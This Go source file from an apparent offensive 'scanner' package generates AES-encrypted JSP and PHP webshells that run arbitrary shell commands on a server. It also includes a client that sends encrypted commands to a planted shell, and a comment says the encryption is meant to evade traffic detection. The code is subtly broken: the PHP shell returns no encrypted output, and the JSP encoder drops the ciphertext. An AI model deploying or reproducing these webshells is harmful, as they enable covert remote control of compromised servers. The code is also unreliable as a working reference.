package scanner

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/url"
	"strings"
)

// 加密 webshell 会话：命令和响应都用 AES-256-CBC 加密，密钥从密码派生。
// 为什么：明文 webshell 在流量里一抓一个准（POST 里带 cmd=whoami 就是特征），
// 加密后被动检测看不到命令内容，只能看到密文。

// deriveKey derives a 32-byte AES key from the password using SHA-256.
func deriveKey(password string) []byte {
	h := sha256.Sum256([]byte(password))
	return h[:]
}

// EncryptAES encrypts plaintext with AES-256-CBC. Returns base64(iv + ciphertext).
func EncryptAES(password, plaintext string) (string, error) {
	key := deriveKey(password)
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return "", err
	}
	padded := pkcs7Pad([]byte(plaintext), aes.BlockSize)
	ciphertext := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(ciphertext, padded)
	return base64.StdEncoding.EncodeToString(append(iv, ciphertext...)), nil
}

// DecryptAES decrypts base64(iv + ciphertext) with AES-256-CBC.
func DecryptAES(password, encoded string) (string, error) {
	key := deriveKey(password)
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err
	}
	if len(raw) < aes.BlockSize*2 {
		return "", fmt.Errorf("ciphertext too short")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	iv := raw[:aes.BlockSize]
	ciphertext := raw[aes.BlockSize:]
	if len(ciphertext)%aes.BlockSize != 0 {
		return "", fmt.Errorf("ciphertext not block-aligned")
	}
	plaintext := make([]byte, len(ciphertext))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(plaintext, ciphertext)
	plaintext = pkcs7Unpad(plaintext, aes.BlockSize)
	return string(plaintext), nil
}

func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	pad := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, pad...)
}

func pkcs7Unpad(data []byte, blockSize int) []byte {
	if len(data) == 0 {
		return data
	}
	padding := int(data[len(data)-1])
	if padding > blockSize || padding == 0 {
		return data
	}
	return data[:len(data)-padding]
}

// BuildEncryptedShellPayload creates a webshell that encrypts/decrypts commands.
// The PHP variant decrypts the incoming command, executes it, and returns
// base64(AES(output)).
func BuildEncryptedShellPayload(shellType, password string) ShellPayload {
	shellType = strings.ToLower(strings.TrimSpace(shellType))
	password = strings.TrimSpace(password)
	if password == "" {
		password = "jingwei"
	}
	keyHex := hex.EncodeToString(deriveKey(password))

	switch shellType {
	case "jsp":
		// JSP variant uses javax.crypto for AES-CBC
		return ShellPayload{
			Type:     "jsp",
			Password: password,
			Filename: "shell_enc.jsp",
			Content: `<%@ page import="java.io.*,javax.crypto.*,javax.crypto.spec.*,java.util.*,java.security.*" %>
<%!
  byte[] hexToBytes(String s) { int l=s.length(); byte[] r=new byte[l/2]; for(int i=0;i<l;i+=2) r[i/2]=(byte)Integer.parseInt(s.substring(i,i+2),16); return r; }
  String dec(String b64) throws Exception {
    byte[] raw=Base64.getDecoder().decode(b64);
    byte[] iv=Arrays.copyOfRange(raw,0,16), ct=Arrays.copyOfRange(raw,16,raw.length);
    SecretKeySpec k=new SecretKeySpec(hexToBytes("` + keyHex + `"),"AES");
    Cipher c=Cipher.getInstance("AES/CBC/PKCS5Padding"); c.init(Cipher.DECRYPT_MODE,k,new IvParameterSpec(iv));
    return new String(c.doFinal(ct),"UTF-8");
  }
  String enc(String s) throws Exception {
    SecretKeySpec k=new SecretKeySpec(hexToBytes("` + keyHex + `"),"AES");
    Cipher c=Cipher.getInstance("AES/CBC/PKCS5Padding"); c.init(Cipher.ENCRYPT_MODE,k);
    byte[] iv=c.getIV(); byte[] ct=c.doFinal(s.getBytes("UTF-8"));
    return Base64.getEncoder().encodeToString(java.util.Arrays.copyOf(iv,iv.length+ct.length));
  }
%>
<%
  String pwd = request.getParameter("pwd");
  String enc = request.getParameter("enc");
  if (pwd != null && pwd.equals("` + password + `") && enc != null) {
    String cmd = dec(enc);
    Process pr = Runtime.getRuntime().exec(new String[]{ "/bin/sh", "-c", cmd });
    BufferedReader br = new BufferedReader(new InputStreamReader(pr.getInputStream()));
    StringBuilder sb = new StringBuilder(); String l;
    while ((l = br.readLine()) != null) sb.append(l).append("\n");
    out.println(enc(sb.toString()));
  } else { out.println("usage"); }
%>`,
			Marker: "usage",
		}
	default:
		// PHP variant
		return ShellPayload{
			Type:     "php",
			Password: password,
			Filename: "shell_enc.php",
			Content: `<?php
function d($b64){$r=base64_decode($b64);$iv=substr($r,0,16);$ct=substr($r,16);return openssl_decrypt($ct,'AES-256-CBC',hash('sha256',"` + password + `",true),OPENSSL_RAW_DATA,$iv);}
function e($s){$iv=openssl_random_pseudo_bytes(16);return base64_encode($iv.openssl_encrypt($s,'AES-256-CBC',hash('sha256',"` + password + `",true),OPENSSL_RAW_DATA,$iv));}
$pwd=isset($_REQUEST['pwd'])?$_REQUEST['pwd']:'';
$enc=isset($_REQUEST['enc'])?$_REQUEST['enc']:'';
if($pwd==='` + password + `'&&$enc!==''){$cmd=d($enc);@system($cmd);exit;}
echo 'usage';
?>`,
			Marker: "usage",
		}
	}
}

// RunEncryptedShellCommand encrypts the command, sends it, and decrypts the response.
func RunEncryptedShellCommand(ctx context.Context, c *DeepClient, shellURL string, payload ShellPayload, command string) (string, error) {
	encCmd, err := EncryptAES(payload.Password, command)
	if err != nil {
		return "", fmt.Errorf("加密命令失败: %w", err)
	}
	form := url.Values{}
	form.Set("pwd", payload.Password)
	form.Set("enc", encCmd)
	req := DeepRequest{
		Method:   "POST",
		URL:      shellURL,
		Body:     form.Encode(),
		BodyType: "form",
		Headers:  map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
	}
	resp := c.Do(ctx, req)
	if resp.Error != "" {
		return "", fmt.Errorf("%s", resp.Error)
	}
	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("shell 返回 HTTP %d", resp.StatusCode)
	}
	// Response is base64(iv + ciphertext); decrypt it
	out, err := DecryptAES(payload.Password, strings.TrimSpace(resp.Body))
	if err != nil {
		return "", fmt.Errorf("解密响应失败: %w", err)
	}
	return out, nil
}
